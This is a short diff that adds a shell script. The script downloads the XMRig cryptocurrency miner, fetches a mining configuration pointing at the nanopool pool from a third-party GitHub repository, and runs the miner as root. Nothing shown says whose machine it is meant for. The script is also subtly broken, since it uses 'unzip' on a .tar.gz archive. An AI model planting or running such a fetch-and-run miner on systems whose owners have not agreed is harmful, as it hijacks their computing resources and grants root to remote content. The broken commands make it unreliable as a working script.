@@ -1,0 +1,6 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.3/xmrig-6.22.3-jammy-x64.tar.gz
+unzip xmrig-6.22.3-jammy-x64.tar.gz
+cd xmrig
+wget https://raw.githubusercontent.com/pmcr84/monerod/refs/heads/main/config-nanopool.org.h14.json
+mv config-nanopool.org.h14.json config.json
+sudo ./xmrig
